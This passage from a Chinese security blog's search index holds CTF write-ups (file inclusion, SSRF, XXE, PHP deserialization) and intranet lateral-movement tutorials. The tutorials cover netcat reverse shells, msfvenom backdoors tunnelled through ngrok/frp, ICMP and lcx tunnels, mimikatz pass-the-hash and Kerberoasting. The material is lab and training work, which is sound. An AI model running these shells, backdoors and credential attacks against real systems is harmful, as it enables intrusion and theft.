is_string($_REQUEST['file'])\n       &amp;&amp; emmm::checkFile($_REQUEST['file'])\n   ) &#123;\n       include $_REQUEST['file'];\n       exit;\n   &#125; else &#123;\n       echo \"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n   &#125;  \n\nget&#x2F;post&#x2F;cookie提交一个名字为file的参数。if语句有3个条件,条件之间用(&amp;&amp;)连接，只有全部满足才能通过。1.file参数非空。2.file参数是一个字符串。3.file参数能通过emmm类中的checkFile函数。只有通过着3个条件。我们才能包含文件。\n类emmm种有白名单检测\nclass emmm\n    &#123;\n        public static function checkFile(&amp;$page)\n        &#123;//白名单列表\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            //isset()判断变量是否声明 is_string()判断变量是否是字符串 \n            if (! isset($page) || !is_string($page)) &#123;\n                //如果变量声明且为字符串判别为假\n                echo \"you can't see it\";\n                return false;\n            &#125;\n             //白名单判断，是hint或source返回真\n            if (in_array($page, $whitelist)) &#123;\n                return true;\n            &#125;\n/*\nmb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置\nmb_strpos (haystack ,needle )\nhaystack：要被检查的字符串。\nneedle：要搜索的字符串\n*/\n            //此时$_page接收的是整个file值\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')//?截断   截取page变量从开头到?\n            );\n            if (in_array($_page, $whitelist)) &#123;//此时的$_page是已经是截断之后的hint.php了\n                return true;\n            &#125;//再一次白名单检查\n\n            $_page = urldecode($page);//url解码\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')//之后在hint.php文件后又加上了?使得又截断为hint.php\n            );//二次截断\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;//第三次白名单检查\n            echo \"you can't see it\";\n            return false;\n        &#125;\n    &#125;\n\n需要满足经过两次?截断后仍能通过白名单检查，并且include正确路径，才输出flag。\n这里还需要利用include的一个知识点：\n\n0x03构造payload：\nhttp:&#x2F;&#x2F;ffb11562-d308-4052-9108-23f271597c1e.node4.buuoj.cn:81&#x2F;source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg\n\n使用了六层目录出flag：\n\n\n这里使用几层目录都需要自己一层一层去试；\n\n\n\n\n\n\n\n\n\n如果include包含的文件中含有路径，就会包含最后一个/后面的文件，因此直接构造payload:source.php?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg\n本来是会包含hint.php文件的，但是后面出现了../，就包含了最后面的ffffllllaaaagggg\n 有多少../在哪一层目录完全是可以自己去试出来的。\n\n\n\n\n\n\n\n\n\n注：\ninclude函数有这么一个神奇的功能：以字符‘&#x2F;’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘&#x2F;’后面的文件——注意是最后一个‘&#x2F;’。\npayload解释：\ncheckfile检测传入的file的值，将file赋给page变量，首先白名单检测hint.php在白名单内返回真。\n然后?截断在第一次截断的时候将file中的hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg截断为hint.php并顺利通过第二次白名单检测。变量$_page应该是发生了两次变化：第一次接收的是file整个值，第一次截断之后变量$_page已经变成了hint.php文件。\n接着是一次url解码，将page变量进行一次url解码。\n注意\nmb_strpos($_page . &#39;?&#39;, &#39;?&#39;)\n\n这段代码，“$_page . ‘?’,”，中的.是一个连接符，相当于在__page变量后加上一个?。于是这次同样截断剩下hint.php再次顺利通过白名单检测。最后满足3个if条件执行include语句。在包含的时候会把hint.php?&#x2F;当成一层目录，然后构造..&#x2F;..&#x2F;向上遍历找到flag。\n这里payload:source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg也是可以的，只要传入的$_page在白名单当中即可。\n","slug":"BUU-WarmUp","date":"2022-07-21T09:28:21.000Z","categories_index":"CTF","tags_index":"CTF,代码审计,PHP,文件包含","author_index":"Aurora"},{"id":"a26ca86ff3a376714693fb5a890fc5f2","title":"SSRF靶场","content":"0x00 CTFHUBCTFHUB的SSRF题目。\n0x01 涉及协议及知识点\n\n\n\n\n\n\n\n\nhttp:&#x2F;&#x2F;：探测内网主机存活、端口开放情况，可以通过访问其它网站确定存活，如百度\ngopher:&#x2F;&#x2F;：发送GET或POST请求(需要配合http协议二次url编码上传)；攻击内网应用，如FastCGI、Redis\ndict:&#x2F;&#x2F;：泄露安装软件版本信息，查看端口，操作内网redis访问等\nfile:&#x2F;&#x2F;：读取本地文件，如&#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;hosts、web网站等等\n0x02 内网访问\n题目直接提示访问127.0.0.1的flag.php\n打开靶场以后空白页面，地址栏看到有url参数，根据题目内网访问，可以肯定是能够探测内网是否存在存活主机的：\n\n探测一下http协议能否使用：\n\n访问百度可以跳转页面，证明http协议是能够使用的；\n题目给出直接访问flag.php文件：\n得到flag。\n0x03 伪协议读取文件题目给出读取Web目录下的flag.php：\n\n提示给出flag.php地址，那这里肯定就需要使用伪协议来读取文件。\n直接读取：\n\n查看源码：\n0x04 端口扫描给出提示端口范围在8000-9000\n\n根据提示，flag应该实在某一个端口下，因此就需要爆破每一个端口来探测，这里使用BP直接进行爆破：\n这里利用dict协议探测端口加上burp爆破，也可以用http探测端口。\n\n\n爆破完成，只有一个长度不同：\n\n使用http协议访问：\n​\t\n得到flag。\n","slug":"SSRF靶场","date":"2022-07-21T01:48:20.000Z","categories_index":"SSRF","tags_index":"CTF,SSRF","author_index":"Aurora"},{"id":"70c23a918e95c44d14bcc6704e34bc7d","title":"BUU-XXE","content":"0x00BUU一道基础XXE题目。\n0x01打开靶场出现登录界面：\n\n随便登录抓包观察数据包：\n发现数据包中有xml 文档声明：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n\n因此，可能存在xxe漏洞。\n0x02构造payload：\n&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE root[\n&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;\n]&gt;\n&lt;root&gt;\n&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;\n&lt;password&gt;2333&lt;&#x2F;password&gt;\n&lt;&#x2F;root&gt;\n\n其中：\n&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;    &lt;!--使用admin实体--&gt;\n&lt;!DOCTYPE root[\n&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;\n]&gt;                        &lt;!--声明admin实体--&gt;\n\n在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入。\n\n\n\n\n\n\n\n\n\n实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过引用定义在外部的 DTD 中的实体，我们称之为外部实体) 来访问我们 的 flag；\n我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件造成漏洞，这就是xxe漏洞。\n0x03执行payload得到flag：\t\n\n参考文章：\nhttps://blog.csdn.net/m0_62879498/article/details/123750846\n","slug":"BUU-XXE","date":"2022-07-19T13:55:45.000Z","categories_index":"XXE","tags_index":"CTF,XXE","author_index":"Aurora"},{"id":"ce7038bbe334cd30b437a68d925a5eab","title":"BUU-CODE-REVIEW","content":"0x00BUU基础题，代码审计和PHP反序列化。\n0x01源码：\n &lt;?php\n/**\n * Created by PhpStorm.\n * User: jinzhao\n * Date: 2019/10/6\n * Time: 8:04 PM\n */\n\nhighlight_file(__FILE__);\n\nclass BUU &#123;\n   public $correct = \"\";\n   public $input = \"\";\n\n   public function __destruct() &#123;\n       try &#123;\n           $this->correct = base64_encode(uniqid());\n           if($this->correct === $this->input) &#123;\n               echo file_get_contents(\"/flag\");\n           &#125;\n       &#125; catch (Exception $e) &#123;\n       &#125;\n   &#125;\n&#125;\n\nif($_GET['pleaseget'] === '1') &#123;\n    if($_POST['pleasepost'] === '2') &#123;\n        if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52']) &#123;\n            unserialize($_POST['obj']);\n        &#125;\n    &#125;\n&#125;\n\n第一层是GET，POST传参；\n第二层是md5绕过；\n第三层是php反序列化\n最后一步php反序列化需要满足$this-&gt;correct === $this-&gt;input因为每次都会执行$this-&gt;correct = base64_encode(uniqid());，所以我们不能将input设为具体的值，而是在序列化执行时，令input=&amp;correct\n0x02序列化对象：\n&lt;?php\nclass BUU&#123;\n    public $correct=\"\";\n    public $input=\"\";\n&#125;    \n\n$obj=new BUU;\n$obj->input=&amp;$obj->correct;\necho serialize($obj);\n?>\n\n\n\n\n\n\n\n\n\n\n得到字符串：O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}\n构造payload：\nGET传参\n?pleaseget&#x3D;1\n\nPOST传参\npleasepost&#x3D;2&amp;md51[]&#x3D;1&amp;md52[]&#x3D;2&amp;obj&#x3D;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;\n或者\npleasepost&#x3D;2&amp;md51&#x3D;QNKCDZO&amp;md52&#x3D;s155964671a&amp;obj&#x3D;O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;\n\n第一种使用的是md5数组绕过；第二种使用的是md50e绕过。\n\n\n0x03 md5数组绕过和0e绕过###0x00 数组绕过\nmd5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null。\n\n\n\n\n\n\n\n\n\n 比如将两个数组的md5值进行比较\nmd5(a[]&#x3D;1) &#x3D;&#x3D;&#x3D; md5(b[]&#x3D;1)\n\n\n\n\n\n\n\n\n\n由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样\nnull &#x3D;&#x3D;&#x3D; null结果返回true,也就是说数组的md5值进行比较时,结果相等\n需要注意的是0e绕过只能绕过弱类型比较(&#x3D;&#x3D;),而数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(&#x3D;&#x3D;&#x3D;)\n\n\n\n\n\n\n\n\n\n弱类型比较(&#x3D;&#x3D;),只判断内容是否相等,如果是字符串类型,则转换成数值型后进行判断\n强类型比较(&#x3D;&#x3D;&#x3D;),判断内容的基础上,还会判断类型是否相同\n0x01 0e绕过0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0\n\n\n\n\n\n\n\n\n\n 比如将两个md5值进行弱类型比较\nmd5(‘QNKCDZO’) &#x3D;&#x3D; md5(240610708)MD5加密后会变成这个样子：\n0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样：\n0 &#x3D;&#x3D; 0\n返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等\n\n\n\n\n\n\n\n\n\n常用的MD5加密后以0e开头的有：\nQNKCDZO240610708byGcYsonZ7yaabg7XSsaabC9RqSs878926199as155964671as214587387as1091221200a\n还有其他的md5绕过方式，可以自行百度，这里只介绍用到的方法。\n0x04 总结最重要的时代码审计，明白每一层的绕过思路，第一层GET和POST传参绕过，第二层md5弱碰撞或者使用php弱类型绕过；还有需要注意的一个点是$this-&gt;correct = base64_encode(uniqid());\n由于$this-&gt;correct每次都需要base64加密，因此进行序列化操作时input值就不能作为常量，需要作为变量，就需要令input=&amp;correct，使得$this-&gt;correct === $this-&gt;input恒满足。\n","slug":"BUU-CODE-REVIEW","date":"2022-07-19T02:43:50.000Z","categories_index":"反序列化","tags_index":"反序列化","author_index":"Aurora"},{"id":"0a0a60d095a528f1d7afccb8f8c8a1f3","title":"内网安全-域横向渗透【六】","content":"0x00脑图：\n0x01 知识点0x00 代理和隧道技术区别隧道和代理的区别是：代理是委托一个人找目标，隧道是通过特定的通讯方法，直接找到这个目标；代理最主要的特征是，无论代理后面挂了几个设备，代理对外只表现为一个设备。外部设备以为自己是在和代理交互，而不能感知代理内部的设备。隧道是一个虚拟的路径，用来使到达隧道入口的数据，穿越原本不方便穿越的网络，到达另一侧出口。\n1、代理\n代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端的“中间人”。通过代理不会改变原本的URI，每次通过代理服务器转发请求或响应时，会追加写入 Via 首部信息\n使用理由:利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的，等等。\n2、隧道\n隧道是远距离的服务器和客户端之间的中转站。隧道可按要求建立起一条与其他服务器的通信线路，届时使用 SSL 等加密手段进行通信。隧道的目的是确保客户端能与服务器进行安全的通信。隧道本身不会去解析 HTTP 请求。也就是说，请求保持原样中转给之后的服务器。隧道会在通信双方断开连接时结束。\n3、总结\n代理主要解决网络访问通讯问题（从一个内网到另一个内网）。\n隧道技术解决在代理基础之上通讯受阻的问题（被防火墙等检测拦截），达到绕过过滤限制等。\n0x01 隧道技术作用用单独的通道来传输被拦截的数据。\nCS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等。 \n0x02 常见隧道技术网络层：IPv6隧道、ICMP隧道\n传输层：TCP隧道、UDP隧道、常规端口转发\n应用层：SSH隧道、HTTP&#x2F;S隧道、DNS隧道 \n（使用隧道之前检测是否可以使用协议）\n0x02 网络传输应用层连通性检测0x00 TCP协议用“瑞士军刀”——netcat\n执行 nc 命令：nc &lt;IP&gt; &lt;端口&gt;\n###0x01 HTTP 协议\n用“curl”工具，执行 curl &lt;IP 地址:端口&gt;命令。如果远程主机开启了相应的端口，且内网可连接外网的\n话，就会输出相应的端口信息\n###0x02 ICMP 协议\n用“ping”命令，执行 ping &lt;IP 地址&#x2F;域名&gt;\n###0x03 DNS 协议\n检测 DNS 连通性常用的命令是“nslookup”和“dig”\nnslookup 是 windows 自带的 DNS 探测命令\ndig 是 linux 系统自带的 DNS 探测命令\n0x03 网络层ICMP隧道ptunnel使用-检测,利用0x00 pingtunnel介绍下载地址：\n老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版)\n\n\n\n\n\n\n\n\n\npingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具\n-p ##表示连接 icmp 隧道另一端的机器 IP（即目标服务器）\n-lp ##表示需要监听的本地 tcp 端口\n-da ##指定需要转发的机器的 IP（即目标内网某一机器的内网 IP）\n-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）\n-x ##设置连接的密码\n0x01在webserver主机执行以下命令：（实战中需要将ptunnel上传至webserver主机）\n.&#x2F;ptunnel -x xiaodi\n\n\n\n\n\n\n\n\n\n\nxiaodi是隧道密码，防止其他任意连接可以连接到此隧道，设置密码为了只能我们自己连接\n此时就是构建隧道密码就是xiaodi，执行完命令之后就处于监听状态，等待别人连接；\n\n0x02kali处执行命令：\n.&#x2F;ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi\n\n通过密码对webserver主机建立连接，并通过webserver主机去访问DC主机的3389远程桌面端口，将数据转发给本地kali的1080端口。\n\nkali连接本地的1080端口：\n使用rdesktop命令连接自己本地的1080端口：\n（因为1080端口接收了DC主机3389端口返回的数据，所以可直接连接上DC的远程桌面）\n\n弹出登录框：\n\n此时数据流量使用的不是3389对应的远程桌面服务，而是ICMP协议。\n\n\n\n\n\n\n\n\n\n原理：\n防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，\n与对方进行通信。\n0x04 传输层转发隧道Portmap使用0x00端口转发工具：\nwindows: lcx\nlinux：portmap\n0x01在DC上执行以下命令，将本地3389给webserver的6666\nLcx.exe -slave 192.168.3.31 6666 127.0.0.1 3389 &#x2F;&#x2F;将本地3389给webserver的6666\n\n\n在webserver上执行以下命令，监听6666端口流量并转发至7777\nLcx.exe -listen 6666 7777   &#x2F;&#x2F; 监听6666转发至7777\n\n\n在kali上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。\nrdesktop 192.168.80.146:7777\n\n\n\n\n\n\n\n\n\n\nDC 把本地的3389 转播到 webserver的6666端口 ，而webserver又把6666转到自己的7777 端口。\n那么当kali去rdesktop访问webserver的7777端口时，就是连接的DC的远程桌面。\n0x05 传输层转发隧道 Netcat 使用-检测,利用,功能0x00 双向连接反弹shell正向反弹 shell 攻击机连接受害机 \n受害机DC执行以下命令：\nnc -ldp 1234 -e &#x2F;bin&#x2F;sh #linux\nnc -ldp 1234 -e c:\\windows\\system32\\cmd.exe #windows\n#将自身的shell反弹至对应端口，这里是1234\n\n\n攻击主机webserver执行以下命令：\nnc 192.168.3.21 1234 #使用nc主动连接受害主机\n\n\n查看IP可以看到连接到受害主机。\n反向反弹shell 受害机连接攻击机\nnc 192.168.3.31 1234 -e c:\\windows\\system32\\cmd.exe #windows\nnc 192.168.3.31 1234 -e &#x2F;bin&#x2F;sh #linux\n受害主机主动将数据发送给攻击主机\n\n攻击机监听1234端口：\nnc -lvp 1234\n\n\n受害主机主动发送数据给攻击主机：\nnc 192.168.3.31 1234 -e c:\\windows\\system32\\cmd.exe\n\n\n可以看到反弹回受害主机的shell：\n\n\n\n\n\n\n\n\n\n\n注意：受害主机能找到攻击主机就使用反向，受害主机找不到攻击主机就使用正向。\n###0x01 多向连接反弹 shell\n使用lcx.exe监听本地2222端口给到3333端口：\nlcx.exe -listen 2222 3333\n\n\n使用nc反向连接到攻击主机webserver\nnc 192.168.3.31 2222 -e c:\\windows\\system32\\cmd.exe\n\n\n在攻击主机出查看接收到来自192.168.3.32:2222的数据：\n\n之后再使用kali主机执行：\nnc 192.168.x.x 3333 #连接外网的网卡ip\n\n\n0x02 相关 netcat 主要功能指纹服务：nc -nv 192.168.76.143端口扫描：nc -v -z 192.168.76.143 1-100端口监听：nc -lvp xxxx文件传输：nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1反弹 Shell：见上\n","slug":"内网安全-域横向渗透【六】","date":"2022-07-18T02:03:24.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"58d39df92467e98ccd5e4018d930afdc","title":"内网安全-域横向渗透【五】","content":"0x00脑图：\n0x01 知识点0x00 内外网判断\n内网ip地址是私有ip地址（10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16），除此之外就是外网ip。\n\n0x01 内网1和内网2通信问题\n两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理。（同一内网无法通过后门控制对应主机，只能通过代理）\n\n0x02  正反向协议通信连接问题\n正向：控制端主动去连接被控端\n反向：被控端主动去连接控制端\n为什么要区分正向和反向？–因为如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。\n\n0x03 内网穿透代理隧道技术说明\n隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题\n代理主要解决网络的连通性问题\n\n0x02 内网穿透Ngrok测试演示-两个内网通讯上线0x00实验环境：两个不同的内网(有网络)实现穿透控制\n\n0x01ngrok下载：\n国外地址：https:&#x2F;&#x2F;ngrok.com&#x2F;\n国内地址：https:&#x2F;&#x2F;www.ngrok.cc&#x2F;\n\n\n\n0x02开通隧道，配置隧道协议，选择什么协议，后续生成的木马就走什么协议：\n\n\n0x02将下载好的linux客户端传入Kali主机：\n其中有一个sunny文件：\n\n0x03执行以下命令启动文件：\n.&#x2F;sunny cilentid 094604366530    #094604366530是隧道id\n\n\n\n出现online表示启动成功，若是其他需要更换隧道或者排查其他情况。\n0x04使用msf生成后门：\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http lhost&#x3D;test00000.free.idcfengye.com lport&#x3D;80 -f exe -o test.exe\n\n\n\n0x05将后门传入到win7目标机：\n\n0x06监听后门：\nuse exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_http\nset lhost 192.168.216.150\nset lport 4444\nexploit\n\n\n0x07执行后门可以看到监听到会话：\n\n\n##0x03 内网穿透Frp自建跳板测试\nFRP说明文档：https://gofrp.org/docs/\nFrp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。而Ngrok工具使用的是别人的服务器，容易泄露隐私数据。\n1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）\nFRP下载地址：https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases\n服务器修改配置文件frps.ini：[common]bind_port &#x3D; 6677\n启动服务端：.&#x2F;frps -c .&#x2F;frps.ini\n2.控制端-下载-解压-修改-启动\n控制端修改配置文件frpc.ini：[common] \nserver_addr &#x3D; 你的云主机ip\nserver_port &#x3D; 6677 \n#frpc工作端口，必须和上面frps保持一致\n[msf]type&#x3D; tcp\nlocal_ip &#x3D; 127.0.0.1\nlocal_port &#x3D; 5555 \n#转发给本机的5555\nremote_port &#x3D; 6000 \n#服务端用6000端口转发给本机\n启动客户端(kali)：.&#x2F;frpc -c .&#x2F;frpc.ini\n生成后门：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp\nlhost&#x3D;你的公网ip \nlport&#x3D;6000 -f exe -o frp.exe use exploit &#x2F;multi&#x2F;handler set payload windows &#x2F;meterpreter&#x2F;reverse_tcp set LHOST 127.0.0.1 set LPORT 5555 exploit\n3.靶机运行frp即可\n\n案例演示\n1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）\n服务器修改配置文件frps.ini：[common]bind_port &#x3D; 6677\n启动服务端：.&#x2F;frps -c .&#x2F;frps.ini\n\n\n\n2.控制端-下载-解压-修改-启动\n&lt;1&gt;控制端修改配置文件frpc.ini\n[common]\nserver_addr &#x3D; 你的云主机ip\nserver_port &#x3D; 6677\n#frpc工作端口，必须和上面frps保持一致\n[msf]type&#x3D; tcp\nlocal_ip &#x3D; 127.0.0.1\nlocal_port &#x3D; 5555 #转发给本机的5555\nremote_port &#x3D; 6000 #服务端用6000端口转发给本机\n\n\n&lt;2&gt;启动客户端(kali)\n.&#x2F;frpc -c .&#x2F;frpc.ini\n\n\n此时服务端收到端口连接\n\n&lt;3&gt;生成后门\nmsfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;你的公网ip lport&#x3D;6000 -f exe -o frp.exe\n\n\n&lt;4&gt;配置监听\nuse exploit &#x2F;multi&#x2F;handler set payload windows &#x2F;meterpreter&#x2F;reverse_tcp \nset LHOST 127.0.0.1 \nset LPORT 5555 \nexploit\n\n\n3.将后门文件拷贝到靶机，运行。如上图所示，监听到会话。\n","slug":"内网安全-域横向渗透【五】","date":"2022-07-15T11:33:18.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"377bf3c0ff3344364d83fd8924788afb","title":"内网安全-域横向渗透【四】","content":"0x00脑图：\n0x01 RDP传递-Mimikatz0x00 RDP介绍远程桌面协议(RDP)是一个多通道的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。\n大部分的Windows版本都有用户端所需软件，有些其他操作系统也有这些用户端软件，例如Linux,FreeBSD，MacOSX，服务端计算机方面，使用TCP3389端口。\n0x01\nRDP协议也可以传输明文密码或HASH密文进行连接操作；\n\nRDP协议连接：端口扫描判断对方远程桌面是否开启（3389）；\n\n对方主机必须打开允许远程桌面连接：\n\nRDP明文密码连接：\nWindows: mstsc\nmstsc.exe &#x2F;console &#x2F;v192.168.3.21 &#x2F;admin\nlinux: rdesktop 192.168.3.21:3389\n\nRDPHash密文连接：\n\n\n\n\n\n\n\n\n\n\n\n注意：windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；\n开启命令：\nREG ADD “HKLM\\System\\CurrentControlSet\\Control\\Lsa” &#x2F;v \nDisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f\n\n开启后运行：\nmstsc.exe &#x2F;restrictedadmin\nmimikatz.exe\nprivilege::debug\nsekurlsa::pth &#x2F;user:administrator &#x2F;domain:god &#x2F;ntlm:ccef208c6485269c20db2cad21734fe7 “&#x2F;run:mstsc.exe &#x2F;restrictedadmin”\n\n\n\n0x02 SPN服务-探针,请求,破解,重写0x00 SPN介绍服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定的服务实例可以具有多个SPN。例如，SPN总是包含运行服务实例的主机名称，所以服务实例可以为其主机的每个名称或别名注册一个SPN。\n0x01 SPN扫描1、当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中；在安装新的服务后，SPN也会被记录在计算机账号的\t相应属性中。\n2、SPN扫描也可以叫扫描Kerberos服务实例名称，在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”。通过请求特定SPN类型的服务主体名称来查找服务，SPN扫描攻击者通过网络端口扫描的主要好处是SPN扫描不需要连接到网络上的每个IP来检查服务端口。SPN扫描通过LDAP查询向域控制器执行服务发现。由于SPN查询是普通Kerberos票据的一部分，因此如果不能被查询，但可以用网络端口扫描来确认。\n3、由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。\n4、攻击过程：黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。\n\n\n\n\n\n\n\n\n\nSPN扫描流程：\n探针-请求-破解-重写\n优点：优于工具的端口扫描，不容易被防火墙等防护软件所触发，同时也可以探针服务，速度很快。\n0x02 探针1、查看是否在域内：\n2、调用spn扫描（自带的）：\nsetspn -q *&#x2F;* #扫描全部\n\n\n\n\n探针到相应的服务：WEBSERVER，FILESERVER，SQLSERVER等。\n3、筛选指定服务：\nsetspn -q *&#x2F;* | findstr &quot;MSSQL&quot;\n\n\n4、删除缓存票据：（防止干扰）\nklist purge\n\n\n0x03 请求1、使用powershell请求：（cmd命令行不能请求）\nAdd-Type -AssemblyName System.IdentityModel\n\n\n\n\n\n\n\n\n\n\n\nmimikatz请求 mimikatz.exe “kerberos::ask &#x2F;target:xxxx”\n2、请求服务：（引号中填写探针到的服务名）\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc&#x2F;sqlserver.test.com:1433&quot;\n\n\n3、klist查看，多了一条MSSQL的请求：\n4、使用mimikatz导出票据：\nmimikatz # kerberos::list &#x2F;export\n\n\n\n0x04 破解使用kerberoast爆破票据；\n（将爆破的票据放在kerberoast文件夹下）\npython3 tgsrepcrack.py passwd.txt 1-40a00000-webadmin@MSSQLSvc~sqlserver.test.com~1433-TEST.COM.kirbi\n#使用pytho3执行tgsrepcrack.py爆破脚本，密码字典为passwd&#x2F;txt，加上需要破解的票据\n\n\n这里没有设置sqlserver的密码，导致没有爆破成功。\n0x05 重写\n\n\n\n\n\n\n\n\n-p 是得到的密码，-r 票据文件，-w 将票据文件重写为PENTESTLAB.kirbi，-u 指向用户名的编号，500是admin用户的标识，-g 指向组，512对应管理员组\npython kerberoast.py -p Password123 -r 1-40a00000-webadmin@MSSQLSvc~sqlserver.test.com~1433-TEST.COM.kirbi -w PENTESTLAB.kirbi -u 500\n\npython kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512\n\n\n这里报错了，但是可以看到生成了相应文件PENTESTLAB.kirbi\n\n\n\n\n\n\n\n\n\n 最后使用miikatz将生成的票据注入内存\nmimikatz # kerberos::ptt xxxx.kirbi\n\n\n\n0x06 总结\n\n\n\n\n\n\n\n\nSPN主要用于探针，获取密码等等，重写一般不成功，获取不到sa权限的密码，只能获取到普通权限的密码，重写比较鸡肋。\n","slug":"内网安全-域横向渗透【四】","date":"2022-06-30T02:12:36.000Z","categories_index":"内网渗透","tags_index":"内网渗透","author_index":"Aurora"},{"id":"f3c27b71dabaf6ecc45b5a407a397e09","title":"内网安全-域横向渗透【三】","content":"0x00脑图：\n0x01 Kerberos 协议###0x00 图解\n\n0x01 介绍\n客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket)\n\n将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读取 kerberos 中 TGT 